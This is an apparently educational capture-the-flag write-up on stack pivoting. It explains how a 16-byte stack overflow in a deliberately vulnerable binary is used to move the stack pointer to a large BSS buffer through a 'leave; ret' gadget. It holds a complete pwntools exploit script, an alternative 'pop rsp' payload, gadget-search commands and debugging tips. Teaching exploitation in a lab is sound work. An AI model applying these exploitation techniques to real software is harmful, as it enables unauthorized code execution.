# Challenge 12: Stack Pivot

## Difficulty: Medium-Hard

## Vulnerability Type: Stack Pivot / Tiny Buffer ROP

## Description
The stack buffer is too small to fit a full ROP chain, so we must "pivot" the stack pointer to a larger buffer elsewhere (BSS segment).

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### Problem: Small Buffer
```c
char small_buffer[16];  // Only 16 bytes!
read(0, small_buffer, 64);  // Overflow of 48 bytes
```

After overwriting saved RBP (8 bytes), we only have ~40 bytes for ROP chain. Not enough for complex operations!

### Solution: Large Global Buffer
```c
char global_buffer[512];  // In BSS segment, writable
read(0, global_buffer, sizeof(global_buffer));
```

We can store our real ROP chain here.

## Exploitation Strategy

### Stack Pivoting
Move the stack pointer (RSP) to point to our controlled buffer, then execute ROP chain from there.

### Common Pivot Gadgets
- `leave; ret` - Sets RSP=RBP, pops RBP, returns
- `xchg rsp, reg; ret` - Swap RSP with another register
- `mov rsp, reg; ret` - Move register to RSP
- `pop rsp; ret` - Directly set RSP

### Using `leave; ret`
```asm
leave  ; Equivalent to: mov rsp, rbp; pop rbp
ret    ; Jump to [rsp]
```

If we control RBP and return address, we can pivot.

### Complete Exploit Strategy
1. Send large ROP chain to `global_buffer`
2. Use small overflow to:
   - Set saved RBP to `global_buffer - 8`
   - Set return address to `leave; ret` gadget
3. When function returns:
   - `leave` sets RSP = RBP = global_buffer - 8
   - `ret` pops return address from global_buffer
4. ROP chain executes from global_buffer

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9012)
else:
    p = process('./challenge')

# Get addresses
p.recvuntil(b'at: ')
global_buf = int(p.recvline().strip(), 16)
p.recvuntil(b'at: ')
win_addr = int(p.recvline().strip(), 16)

log.info(f"Global buffer: {hex(global_buf)}")
log.info(f"win(): {hex(win_addr)}")

# Find pivot gadget
rop = ROP(elf)
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

log.info(f"leave; ret: {hex(leave_ret)}")

# Step 1: Build ROP chain in global_buffer
# For this simple challenge, just call win()
rop_chain = p64(ret)  # Alignment
rop_chain += p64(win_addr)
rop_chain = rop_chain.ljust(512, b'\x00')

p.sendafter(b'chain: ', rop_chain)

# Step 2: Pivot stack to global_buffer
# The leave gadget does: mov rsp, rbp; pop rbp; ret
# We want RSP to become global_buffer
# When leave executes: RSP = RBP
# So we set RBP = global_buffer

offset = 16  # Small buffer size

payload2 = b'A' * offset
payload2 += p64(global_buf)    # Saved RBP -> pivot target
payload2 += p64(leave_ret)     # Return address

p.sendafter(b'here: ', payload2)

p.interactive()
```

### Alternative: Direct RSP Control
If we find a `pop rsp; ret` gadget:
```python
payload = b'A' * offset
payload += b'B' * 8           # Saved RBP (don't care)
payload += p64(pop_rsp)       # Return to pop rsp
payload += p64(global_buf)    # New RSP value
# Now execution continues from global_buf
```

## Understanding leave; ret

```asm
leave:
    mov rsp, rbp    ; RSP = RBP
    pop rbp         ; RBP = [RSP], RSP += 8

ret:
    pop rip         ; RIP = [RSP], RSP += 8
    jmp rip
```

Sequence:
1. Function returns, executes `leave`
2. RSP becomes RBP (our fake stack)
3. RBP is popped from fake stack
4. `ret` pops return address from fake stack
5. Execution continues with ROP chain on fake stack

## Automated Detection
- **Small Buffer**: Overflow size < typical ROP chain size
- **Large Global Buffer**: Writable memory available (BSS/data)
- **Pivot Gadget**: leave;ret or similar exists
- **Strategy**: Write ROP chain to large buffer, pivot stack to it

## Why Stack Pivoting?

Real-world scenarios:
- Tiny stack buffers
- Stack space exhausted
- Need to build large ROP chains
- Executing code from heap/BSS

## Learning Objectives
- Stack pointer manipulation
- Understanding `leave` instruction
- BSS segment exploitation
- Multi-stage buffer usage
- Advanced ROP techniques

## Finding Pivot Gadgets
```bash
ROPgadget --binary challenge | grep "leave"
ROPgadget --binary challenge | grep "xchg.*rsp"
ROPgadget --binary challenge | grep "mov rsp"
ROPgadget --binary challenge | grep "pop rsp"
```

## Debugging Tips
Use GDB to watch stack pivot:
```gdb
b *vuln+XX  # Before second read
b *vuln+YY  # Before return
commands
  x/20gx $rsp
  x/20gx global_buffer
  i r rbp rsp
  continue
end
run
```
